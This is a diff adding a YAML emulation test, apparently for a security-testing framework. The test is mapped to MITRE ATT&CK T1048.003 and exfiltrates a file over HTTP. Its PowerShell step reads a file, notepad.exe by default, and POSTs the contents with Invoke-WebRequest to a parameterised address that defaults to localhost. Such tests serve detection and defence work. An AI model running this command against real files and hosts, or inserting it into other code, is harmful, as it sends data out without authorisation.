@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Exfiltration Over Alternative Protocol - HTTP
+description: |
+    Exfiltration of specified file over HTTP.
+    Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.
+args:
+    - name: input_file
+      type: path
+      default: C:\Windows\System32\notepad.exe
+    - name: ip_address
+      type: string
+      default: http://127.0.0.1
+uuid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+    subtechniques:
+        - 'T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: exfiltration-over-alternative-protocol---http
+      inline: |
+        $content = Get-Content {{.Args.input_file}}
+        Invoke-WebRequest -Uri {{.Args.ip_address}} -Method POST -Body $content
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
